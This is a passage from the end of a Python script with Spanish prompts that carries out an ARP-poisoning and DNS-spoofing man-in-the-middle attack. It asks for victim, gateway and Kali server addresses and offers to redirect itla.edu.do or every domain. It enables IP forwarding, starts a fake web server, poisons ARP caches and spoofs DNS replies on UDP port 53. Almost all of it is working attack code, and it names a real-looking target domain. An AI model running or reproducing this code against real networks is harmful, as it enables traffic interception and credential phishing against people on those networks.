    ip_victima = input("[?] IP de la victima                : ").strip()
    ip_gateway = input("[?] IP del gateway/router           : ").strip()
    ip_kali    = input("[?] IP de Kali (servidor falso)     : ").strip()

    print()
    print("[*] Dominios a redirigir:")
    print("    1. Solo itla.edu.do")
    print("    2. Todos los dominios")

    while True:
        op = input("\n[?] Selecciona (1 o 2): ").strip()
        if op == "1":
            dominios = ["itla.edu.do.", "www.itla.edu.do."]
            break
        elif op == "2":
            dominios = []
            break
        print("[!] Opcion invalida.")

    return interfaz, ip_victima, ip_gateway, ip_kali, dominios


def main():
    verificar_root()
    interfaz, ip_victima, ip_gateway, ip_kali, dominios = menu()

    print(f"\n[*] Obteniendo MAC de la victima ({ip_victima})...")
    mac_victima = obtener_mac(ip_victima, interfaz)
    if not mac_victima:
        print(f"[!] No se pudo obtener la MAC de {ip_victima}.")
        sys.exit(1)

    print(f"[*] Obteniendo MAC del gateway ({ip_gateway})...")
    mac_gateway = obtener_mac(ip_gateway, interfaz)
    if not mac_gateway:
        print(f"[!] No se pudo obtener la MAC de {ip_gateway}.")
        sys.exit(1)

    print(f"\n[+] MAC Victima : {mac_victima}")
    print(f"[+] MAC Gateway : {mac_gateway}")

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding activado")

    t_web = threading.Thread(
        target=iniciar_servidor_web, args=(80,), daemon=True)
    t_web.start()

    t_arp = threading.Thread(
        target=arp_poison,
        args=(ip_victima, mac_victima, ip_gateway, mac_gateway, interfaz),
        daemon=True)
    t_arp.start()

    print(f"[+] Esperando consultas DNS...\n")

    try:
        sniff(
            iface=interfaz,
            filter="udp port 53",
            prn=lambda pkt: dns_spoof(pkt, ip_kali, dominios),
            store=False
        )
    except KeyboardInterrupt:
        print("\n[*] Ataque detenido.")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.exit(0)


if __name__ == "__main__":
    main()
